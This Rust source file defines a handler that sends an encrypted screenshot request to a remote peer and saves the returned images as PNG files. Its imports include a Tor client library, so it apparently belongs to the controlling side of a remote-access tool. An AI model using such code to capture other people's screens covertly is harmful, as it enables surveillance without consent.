use std::fmt::Debug;
use crate::handlers::EncryptionData;
use arti_client::isolation::Isolation;
use chrono::Utc;
use cotor_core::network::packet::NetworkPacket;
use cotor_core::network::packet::screenshot::ScreenShotPacket;
use image::{ImageBuffer, Rgba};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tempfile::TempDir;
use tokio::sync::RwLock;
use tracing::event;

trait SaveDir: AsRef<Path> + Send + Sync + Debug {}
impl SaveDir for PathBuf {}
impl SaveDir for TempDir {}

#[derive(Debug)]
pub struct ScreenshotHandler {
    save_dir: Box<dyn SaveDir>,
    suffix: String,
}
impl ScreenshotHandler {
    pub fn new_temp(suffix: String) -> Result<Self, String> {
        //get named temp dir
        let dir =
            TempDir::new().map_err(|e| format!("Failed to create temporary directory: {e}"))?;
        Ok(Self {
            save_dir: Box::new(dir.path().to_path_buf()),
            suffix,
        })
    }

    pub fn new_named_temp(name: &str, suffix: String) -> Result<Self, String> {
        let dir = TempDir::with_suffix(name)
            .map_err(|e| format!("Failed to create named temporary directory: {e}"))?;
        Ok(Self {
            save_dir: Box::new(dir.path().to_path_buf()),
            suffix,
        })
    }

    pub fn new_dir(path: impl AsRef<Path>, suffix: String) -> Result<Self, String> {
        let path = path.as_ref();
        if !path.exists() {
            return Err(format!("Path does not exist: {}", path.display()));
        }
        if !path.is_dir() {
            return Err(format!("Path is not a directory: {}", path.display()));
        }
        Ok(Self {
            save_dir: Box::new(path.to_path_buf()),
            suffix,
        })
    }
    pub async fn request(
        sender_queue_tx: tokio::sync::mpsc::Sender<NetworkPacket>,
        enc_data: Arc<RwLock<EncryptionData>>,
    ) -> Result<(), String> {
        let packet = NetworkPacket::new(
            &ScreenShotPacket::Request,
            &enc_data.read().await.encryption_type,
            &enc_data.read().await.key_chain,
        )?;
        sender_queue_tx
            .send(packet)
            .await
            .map_err(|e| format!("Failed to send screenshot request: {}", e))?;
        Ok(())
    }

    pub async fn handle(&self, packet: ScreenShotPacket) -> Result<(), String> {
        match packet {
            ScreenShotPacket::Response(images) => {
                for (index, image) in images.into_iter().enumerate() {
                    let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
                    let file_name = format!("screenshot_{timestamp}_{index}_{}.png", self.suffix);
                    let base_path = (*self.save_dir).as_ref().to_path_buf();
                    let file_path = base_path.join(file_name);
                    let image_buffer: ImageBuffer<Rgba<u8>, _> =
                        ImageBuffer::from_raw(image.width, image.height, image.buffer)
                            .ok_or("Failed to convert to ImageBuffer")?;
                    if let Err(e) = image_buffer.save(&file_path) {
                        event!(
                            tracing::Level::ERROR,
                            "Failed to save screenshot {}: {}",
                            file_path.display(),
                            e
                        );
                    } else {
                        event!(
                            tracing::Level::INFO,
                            "Saved screenshot to {}",
                            file_path.display()
                        );
                    }
                }
            }
            ScreenShotPacket::Request => {
                event!(tracing::Level::INFO, "Client cannot request screenshot");
            }
        }
        Ok(())
    }
}
